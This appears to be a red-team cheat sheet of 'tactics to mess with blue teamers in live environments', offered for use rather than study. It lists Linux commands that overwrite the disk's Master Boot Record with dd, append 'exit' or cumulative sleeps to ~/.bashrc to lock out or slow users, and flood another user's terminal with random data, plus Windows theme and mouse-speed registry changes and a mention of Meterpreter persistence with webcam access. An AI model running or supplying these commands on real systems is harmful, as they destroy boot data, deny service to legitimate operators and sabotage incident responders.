A small collection of tactics to mess with blue teamers in live environments...

# Linux

```shell
xrandr -o inverted # Flip X11 desktop session upside down.

dd if=nyan.mbr of=/dev/sda # NyanMBR necessary, overwrites Master Boot Recrd with Nyancat animation. The MBR image can be found in this repository: https://github.com/brainsmoke/nyanmbr

echo exit >> ~/.bashrc # Add a logout to the login script

cat /dev/urandom > /dev/pts/<pts number> # Fill terminal with random noise spewing out at high speed.

echo "echo "sleep 1;" >> ~/.bashrc">> ~/.bashrc # Add a longer sleep to their terminal startup every time they login. 
```

# Windows
```powershell
start C:\Windows\Resources\Ease of Access Themes\hc1.theme # Start the Windows high-contrast theme

reg add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "VALUE" /f # Modify mouse speed
```

Persistence with [[Meterpreter]] affords many options like `webcam_chat`. 
